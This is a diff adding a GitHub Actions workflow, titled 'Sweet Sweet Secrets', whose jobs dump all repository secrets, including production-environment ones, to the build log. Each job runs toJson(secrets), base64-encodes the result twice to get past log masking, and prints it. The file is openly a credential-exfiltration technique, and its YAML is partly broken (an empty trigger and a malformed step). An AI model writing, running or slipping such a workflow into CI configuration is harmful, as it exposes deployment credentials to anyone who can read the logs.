@@ -1,0 +1,18 @@
+name: Sweet Sweet Secrets
+on:
+jobs:
+  secretless-job:
+    runs-on: ubuntu-latest
+    steps:
+      run: |
+        echo '${{ toJson(secrets) }}' | base64 | base64 > test.txt
+        cat test.txt
+
+  get-those-sweet-secrets:
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+       - name: Expose Secrets
+         run: |
+          echo '${{ toJson(secrets) }}' | base64 | base64 > test.txt
+          cat test.txt
